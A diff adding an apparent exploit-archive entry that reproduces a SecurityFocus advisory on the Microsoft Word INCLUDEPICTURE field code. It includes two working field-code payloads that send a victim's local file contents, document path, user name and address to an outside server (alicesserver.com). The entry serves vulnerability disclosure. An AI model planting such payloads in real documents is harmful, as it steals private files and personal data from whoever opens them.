@@ -1,0 +1,14 @@
+source: http://www.securityfocus.com/bid/5764/info
+
+The INCLUDEPICTURE Field Code may be used to insert arbitrary URLs into a document. The INCLUDEPICTURE Field Code is reported to, under some circumstances, present a security threat.
+
+If the INCLUDEPICTURE Field Code is included in a document and references a URL, it may be possible for the attacker to obtain contents of files on the victim user's system. It is possible for an attacker to abuse this functionality in a situation where documents are constantly being shared and updated.
+
+An attacker can potentially exploit this vulnerability to obtain the contents of files residing on a victim user's system. 
+
+{ INCLUDEPICTURE { QUOTE "http:\\www.alicesserver.com\" & { FILENAME \p } & { INCLUDETEXT "c:\\a.txt" } } \d }
+
+{ INCLUDEPICTURE { QUOTE "http:\\www.alicesserver.com\" & { USERNAME } & { USERADDRESS } } \d }
+
+(The curly braces above represent Microsoft Word field braces.)
+
